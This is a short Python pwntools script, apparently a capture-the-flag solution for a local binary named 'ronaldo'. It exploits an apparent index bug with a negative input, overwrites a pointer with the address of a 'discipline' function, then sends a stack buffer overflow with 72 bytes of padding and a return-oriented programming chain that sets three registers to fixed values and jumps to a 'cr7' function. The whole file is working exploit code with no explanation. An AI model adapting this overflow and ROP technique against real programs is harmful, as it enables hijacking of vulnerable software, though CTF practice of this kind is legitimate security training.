from pwn import *

pr = process('./ronaldo')
elf = context.binary = ELF('./ronaldo', checksec=False)
context.binary = elf
rop = ROP(elf)


pr.sendline(b'-4')


payload = (p64(elf.symbols['discipline'] + 4))
pr.send(payload)


rop.raw(b'A' * 72)
rop.rdi = p64(0x41423938)
rop.rsi = p64(0x51524948)
rop.rdx = p64(0x77777777)
rop.raw(p64(elf.symbols['cr7']))

pr.send(rop.chain())
print(rop.chain())

pr.interactive()